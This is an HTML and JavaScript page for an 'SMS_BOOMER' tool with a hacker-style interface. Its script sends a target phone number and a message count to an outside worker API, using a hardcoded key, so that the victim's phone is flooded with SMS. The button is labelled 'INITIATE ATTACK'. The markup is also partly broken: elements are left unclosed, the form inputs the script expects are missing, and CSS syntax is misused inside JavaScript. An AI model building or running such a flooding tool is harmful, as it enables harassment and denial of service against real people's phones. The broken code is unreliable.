<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AHAD // SMS_BOOMER_v5.0</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #0a0f0d; --surface-color: #101814; --border-color: #2a3b33;
            --hacker-green: #00ff41; --hacker-red: #ff004f; --hacker-blue: #00a2ff;
            --text-color: #e6f1ea; --text-muted: #8c9b92; --font-mono: 'Fira Code', monospace;
            --glow-intensity: 2;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif; background-color: var(--bg-dark); color: var(--text-color);
            display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px;
            overflow-x: hidden;
            position: relative;
        }
        
        /* Matrix code rain effect */
        #matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.15;
            pointer-events: none;
        }
        
        /* Terminal scanline effect */
        .scanlines {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, 
                rgba(255, 255, 255, 0) 0%, 
                rgba(255, 255, 255, 0.03) 50%, 
                rgba(255, 255, 255, 0) 100%);
            background-size: 100% 4px;
            z-index: 999;
            pointer-events: none;
            opacity: 0.2;
        }
        
        .spinner { 
            border: 4px solid rgba(0, 255, 65, 0.2); 
            border-top: 4px solid var(--hacker-green); 
            border-radius: 50%; 
            width: 25px; 
            height: 25px; 
            animation: spin 1s linear infinite; 
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        /* Terminal flicker effect */
        @keyframes terminalFlicker {
            0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
                opacity: 1;
            }
            20%, 24%, 55% {
                opacity: 0.7;
            }
        }
        
        /* Text glitch effect */
        @keyframes textGlitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
        
        /* --- Header & Main Container --- */
        .site-header { 
            text-align: center; 
            margin-bottom: 30px; 
            position: relative;
            animation: terminalFlicker 10s infinite;
        }
        .site-header h1 { 
            font-family: var(--font-mono); 
            font-size: 2.2rem; 
            font-weight: 500; 
            color: var(--hacker-green); 
            margin-bottom: 5px; 
            text-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
            letter-spacing: 1px;
            position: relative;
        }
        .site-header h1::after {
            content: '_';
            animation: blink 1s step-end infinite;
        }
        .site-header p { 
            font-family: var(--font-mono); 
            color: var(--text-muted); 
            font-size: 0.9rem;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        
        .control-panel-container { 
            background-color: var(--surface-color); 
            border-radius: 10px; 
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2); 
            padding: 30px 40px; 
            max-width: 800px; 
            width: 100%; 
            border: 1px solid var(--border-color);
            position: relative;
            overflow: hidden;
            animation: terminalFlicker 15s infinite;
        }
        
        .control-panel-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: var(--hacker-green);
            box-shadow: 0 0 10px var(--hacker-green);
            animation: scanline 3s linear infinite;
        }
        
        @keyframes scanline {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(500px); }
        }
        
        /* --- Form & Button --- */
        .form-controls { display: grid; grid-template-columns: 1fr; gap: 25px; margin-bottom: 25px; }
        .form-group { position: relative; }
        .form-group label { 
            display: block; 
            font-family: var(--font-mono); 
            font-weight: 500; 
            margin-bottom: 10px; 
            color: var(--text-muted); 
            font-size: 0.9rem;
        }
        .form-group input[type="tel"], .form-group input[type="number"] { 
            width: 100%; 
            padding: 12px 12px 12px 35px; 
            border: 1px solid var(--border-color); 
            border-radius: 8px; 
            font-family: 'Poppins', sans-serif; 
            font-size: 1rem; 
            background: var(--bg-dark); 
            color: var(--text-color); 
            transition: all 0.3s; 
            letter-spacing: 1px;
        }
        .form-group::before { 
            content: '>'; 
            position: absolute; 
            left: 15px; 
            top: 43px; 
            font-family: var(--font-mono); 
            color: var(--text-muted); 
        }
        .form-group input:focus { 
            outline: none; 
            border-color: var(--hacker-green); 
            box-shadow: 0 0 8px rgba(0, 255, 65, 0.3); 
        }
        
        .intensity-control { display: flex; border-radius: 8px; overflow: hidden; border: 1px solid var(--border-color); }
        .intensity-control input[type="radio"] { display: none; }
        .intensity-control label {
            flex: 1; 
            padding: 12px; 
            text-align: center; 
            cursor: pointer;
            font-family: var(--font-mono); 
            background: var(--bg-dark); 
            color: var(--text-muted);
            transition: all 0.2s; 
            position: relative;
            font-size: 0.85rem;
        }
        .intensity-control label:not(:last-child) { border-right: 1px solid var(--border-color); }
        .intensity-control input[type="radio"]:checked + label { 
            background: var(--hacker-green); 
            color: var(--bg-dark); 
            font-weight: 700; 
        }
        
        #trigger-btn { 
            border: 1px solid; 
            padding: 15px 30px; 
            border-radius: 8px; 
            font-size: 1.1rem; 
            font-weight: 600; 
            cursor: pointer; 
            transition: all 0.3s ease; 
            width: 100%; 
            text-transform: uppercase; 
            letter-spacing: 1px; 
            margin-top: 10px; 
            background-color: var(--hacker-green); 
            border-color: var(--hacker-green); 
            color: var(--bg-dark); 
            font-family: var(--font-mono);
            position: relative;
            overflow: hidden;
        }
        #trigger-btn:hover:not(:disabled) { 
            transform: translateY(-3px); 
            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.4); 
        }
        #trigger-btn:disabled { 
            background: var(--text-muted); 
            border-color: var(--text-muted); 
            cursor: not-allowed; 
            opacity: 0.5; 
        }
        
        #trigger-btn::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: rgba(255, 255, 255, 0.1);
            transform: rotate(45deg);
            transition: all 0.6s;
            opacity: 0;
        }
        
        #trigger-btn:hover::before {
            animation: shine 1.5s forwards;
        }
        
        @keyframes shine {
            0% { opacity: 0; transform: rotate(45deg) translate(-50%, -50%); }
            20% { opacity: 1; }
            100% { opacity: 0; transform: rotate(45deg) translate(50%, 50%); }
        }

        /* --- Results & Log --- */
        .results-area { margin-top: 25px; text-align: left; }
        #system-log-live {
            font-family: var(--font-mono); 
            font-size: 0.9rem; 
            min-height: 120px; 
            max-height: 250px;
            overflow-y: auto; 
            border-radius: 8px; 
            padding: 15px;
            background-color: var(--bg-dark); 
            border: 1px solid var(--border-color);
            white-space: pre-wrap; 
            word-wrap: break-word;
            position: relative;
        }
        #system-log-live .log-entry { 
            display: flex; 
            align-items: center; 
            gap: 10px; 
            margin-bottom: 8px;
            animation: logEntry 0.5s ease-out;
        }
        
        @keyframes logEntry {
            from { opacity: 0; transform: translateY(5px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        #system-log-live::-webkit-scrollbar { width: 8px; }
        #system-log-live::-webkit-scrollbar-track { background: var(--bg-dark); }
        #system-log-live::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
        
        .result-summary {
            margin-top: 20px;
            display: flex;
            justify-content: space-around;
            text-align: center;
            font-family: var(--font-mono);
            padding: 15px;
            background: var(--bg-dark);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            animation: glow 2s infinite alternate;
        }
        
        @keyframes glow {
            from { box-shadow: 0 0 5px var(--hacker-green); }
            to { box-shadow: 0 0 15px var(--hacker-green); }
        }
        
        .summary-item strong { display: block; font-size: 1.5rem; }
        .summary-item .success { color: var(--hacker-green); }
        .summary-item .failure { color: var(--hacker-red); }
        
        .site-footer { 
            margin-top: 40px; 
            text-align: center; 
            color: var(--text-muted); 
            font-size: 0.9rem; 
            font-family: var(--font-mono);
        }
        .site-footer p { margin-bottom: 10px; }
        .site-footer a { 
            color: var(--hacker-green); 
            text-decoration: none; 
            font-weight: 500; 
            position: relative;
        }
        
        .site-footer a::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            width: 100%;
            height: 1px;
            background: var(--hacker-green);
            transform: scaleX(0);
            transition: transform 0.3s;
        }
        
        .site-footer a:hover::after {
            transform: scaleX(1);
        }
        
        /* Status indicators */
        .status-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 8px;
        }
        
        .status-online {
            background-color: var(--hacker-green);
            box-shadow: 0 0 6px var(--hacker-green);
        }
        
        .status-offline {
            background-color: var(--hacker-red);
        }
        
        /* Terminal header with connection status */
        .terminal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid var(--border-color);
        }
        
        .connection-status {
            display: flex;
            align-items: center;
            font-family: var(--font-mono);
            font-size: 0.8rem;
            color: var(--text-muted);
        }
        
        /* Responsive adjustments */
        @media (max-width: 768px) {
            .control-panel-container {
                padding: 20px;
            }
            
            .intensity-control {
                flex-direction: column;
            }
            
            .intensity-control label:not(:last-child) {
                border-right: none;
                border-bottom: 1px solid var(--border-color);
            }
            
            .result-summary {
                flex-direction: column;
                gap: 15px;
            }
        }
    </style>
</head>
<body>
    <div id="matrix-bg"></div>
    <div class="scanlines"></div>
    
    <header class="site-header">
        <h1>AHAD // SMS_BOOMER_v5.0</h1>
        <p>// ANONYMOUS TRANSMISSION PROTOCOL</p>
    </header>

    <main class="control-panel-container">
        <div class="terminal-header">

    <footer class="site-footer">

    <script>
        // Matrix code rain background
        function createMatrixEffect() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const container = document.getElementById('matrix-bg');
            
            container.appendChild(canvas);
            
            let width = window.innerWidth;
            let height = window.innerHeight;
            
            canvas.width = width;
            canvas.height = height;
            
            const letters = '01010101010101010101010101010101';
            const fontSize = 12;
            const columns = width / fontSize;
            
            const drops = [];
            for(let i = 0; i < columns; i++) {
                drops[i] = 1;
            }
            
            function draw() {
                ctx.fillStyle = 'rgba(10, 15, 13, 0.05)';
                ctx.fillRect(0, 0, width, height);
                
                ctx.fillStyle = var(--hacker-green);
                ctx.font = `${fontSize}px ${var(--font-mono)}`;
                
                for(let i = 0; i < drops.length; i++) {
                    const text = letters[Math.floor(Math.random() * letters.length)];
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                    
                    if(drops[i] * fontSize > height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    
                    drops[i]++;
                }
            }
            
            setInterval(draw, 33);
            
            window.addEventListener('resize', () => {
                width = window.innerWidth;
                height = window.innerHeight;
                canvas.width = width;
                canvas.height = height;
            });
        }
        
        const SMSMatrix = {
            init() {
                this.ui = {
                    recipientInput: document.getElementById('recipient-number'),
                    triggerBtn: document.getElementById('trigger-btn'),
                    systemLog: document.getElementById('system-log-live'),
                };
                this.API_BASE_URL = 'https://fak-sms-boomber.jokerkeep057.workers.dev/';
                this.API_KEY = '32563'; // The password for your worker API
                
                this.setupEventListeners();
                this.logMessage('SYSTEM LOG: Standby. Awaiting user input...');
                
                // Initialize matrix effect
                createMatrixEffect();
            },

            setupEventListeners() {
                this.ui.triggerBtn.addEventListener('click', () => this.startProcess());
            },

            logMessage(text, type = 'INFO') {
                const entry = document.createElement('div');
                entry.className = 'log-entry';
                let color = 'var(--text-muted)';
                if (type === 'SUCCESS') color = 'var(--hacker-green)';
                if (type === 'ERROR') color = 'var(--hacker-red)';
                entry.style.color = color;
                
                const timestamp = new Date().toLocaleTimeString();
                entry.innerHTML = `<span class="status-indicator ${type === 'SUCCESS' ? 'status-online' : type === 'ERROR' ? 'status-offline' : ''}"></span> [${timestamp}] ${type}: ${text}`;
                
                this.ui.systemLog.appendChild(entry);
                this.ui.systemLog.scrollTop = this.ui.systemLog.scrollHeight;
            },
            
            setButtonState(isLoading) {
                this.ui.triggerBtn.disabled = isLoading;
                this.ui.triggerBtn.innerHTML = isLoading ? '<div class="spinner" style="margin: 0 auto;"></div>' : 'INITIATE ATTACK';
            },

            displaySummary(data) {
                const summaryDiv = document.createElement('div');
                summaryDiv.className = 'result-summary';
                summaryDiv.innerHTML = `
                    <div class="summary-item">
                        <strong class="success">${data.successCount}</strong>
                        <span>SUCCESS</span>
                    </div>
                    <div class="summary-item">
                        <strong class="failure">${data.failureCount}</strong>
                        <span>FAILURE</span>
                    </div>
                    <div class="summary-item">
                        <strong>${data.totalRequests}</strong>
                        <span>TOTAL</span>
                    </div>
                `;
                this.ui.systemLog.appendChild(summaryDiv);
            },

            async startProcess() {
                const recipientNumber = this.ui.recipientInput.value.trim();
                const count = document.querySelector('input[name="intensity"]:checked').value;

                if (!recipientNumber || !/^\d{10,14}$/.test(recipientNumber)) {
                    this.logMessage('Invalid Target Node (10-14 digits required).', 'ERROR');
                    // Add glitch effect to input
                    this.ui.recipientInput.style.animation = 'textGlitch 0.3s';
                    setTimeout(() => {
                        this.ui.recipientInput.style.animation = '';
                    }, 300);
                    return;
                }

                this.setButtonState(true);
                this.ui.systemLog.innerHTML = '';
                this.logMessage(`Initializing attack on node ${recipientNumber} with ${count} packets...`);
                this.logMessage('This may take a moment. The worker is processing all requests.');
                
                try {
                    const apiUrl = `${this.API_BASE_URL}?key=${this.API_KEY}&number=${recipientNumber}&count=${count}`;
                    const response = await fetch(apiUrl);
                    const data = await response.json();

                    if (!response.ok || !data.success) {
                        throw new Error(data.error || 'The API returned an unexpected error.');
                    }
                    
                    this.logMessage(`All ${data.totalRequests} packets transmitted. Analyzing results...`, 'SUCCESS');
                    this.displaySummary(data);

                } catch (error) {
                    console.error("API Error:", error);
                    this.logMessage(`A critical error occurred: ${error.message}`, 'ERROR');
                } finally {
                    this.setButtonState(false);
                }
            }
        };

        document.addEventListener('DOMContentLoaded', () => SMSMatrix.init());
    </script>
</body>
